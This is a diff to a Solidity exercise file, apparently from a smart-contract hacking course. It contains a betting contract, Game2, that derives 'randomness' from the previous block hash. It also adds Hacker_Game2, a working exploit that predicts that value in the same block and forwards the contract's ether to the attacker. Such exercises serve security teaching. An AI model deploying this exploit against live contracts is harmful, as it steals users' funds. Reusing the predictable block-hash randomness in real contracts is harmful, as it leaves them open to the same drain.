@@ -7,39 +7,64 @@ pragma solidity ^0.8.13;
  * @author JohnnyTime (https://smartcontractshacking.com)
  */
 contract Game2 {
+  // Calculate wins in a row for every player
+  mapping(address => uint) public players;
+  uint256 lastValue;
+  uint8 constant MIN_WINS_IN_A_ROW = 5;
 
-    // Calculate wins in a row for every player
-    mapping(address => uint) public players;
-    uint256 lastValue;
-    uint8 constant MIN_WINS_IN_A_ROW = 5;
+  constructor() payable {}
 
-    constructor() payable {}
+  function play(bool _guess) external payable {
+    require(msg.value == 1 ether, "Playing costs 1 ETH");
 
-    function play(bool _guess) external payable {
-        
-        require(msg.value == 1 ether, "Playing costs 1 ETH");
+    // uint representation of previous block hash
+    uint256 value = uint256(blockhash(block.number - 1));
+    require(lastValue != value, "One round at a block!");
+    lastValue = value;
 
-        // uint representation of previous block hash
-        uint256 value = uint256(blockhash(block.number - 1));
-        require(lastValue != value, "One round at a block!");
-        lastValue = value;
+    // Generate a random number, and check the answer
+    uint256 random = value % 2;
+    bool answer = random == 1 ? true : false;
 
-        // Generate a random number, and check the answer
-        uint256 random = value % 2;
-        bool answer = random == 1 ? true : false;
+    if (answer == _guess) {
+      players[msg.sender]++;
 
-        if (answer == _guess) {
-
-            players[msg.sender]++;
-
-            // Did pleayer win 5 times in a row?
-            if(players[msg.sender] == MIN_WINS_IN_A_ROW) {
-                (bool sent, ) = msg.sender.call{value: address(this).balance}("");
-                require(sent, "Failed to send ETH");
-                players[msg.sender] = 0;
-            }
-        } else {
-            players[msg.sender] = 0;
-        }
+      // Did pleayer win 5 times in a row?
+      if (players[msg.sender] == MIN_WINS_IN_A_ROW) {
+        (bool sent, ) = msg.sender.call{ value: address(this).balance }("");
+        require(sent, "Failed to send ETH");
+        players[msg.sender] = 0;
+      }
+    } else {
+      players[msg.sender] = 0;
     }
+  }
+}
+
+contract Hacker_Game2 {
+  Game2 game;
+  address payable owner;
+
+  constructor(address _game) {
+    game = Game2(_game);
+    owner = payable(msg.sender);
+  }
+
+  function playAndWin() external payable {
+    uint256 value = uint256(blockhash(block.number - 1));
+
+    // Generate a random number, and check the answer
+    uint256 random = value % 2;
+    bool answer = random == 1 ? true : false;
+
+    (bool success, ) = address(game).call{ value: msg.value }(
+      abi.encodeWithSignature("play(bool)", answer)
+    );
+    require(success, "Play function failed");
+  }
+
+  receive() external payable {
+    (bool success, ) = owner.call{ value: address(this).balance }("");
+    require(success, "Trasfert to attacker failed");
+  }
 }
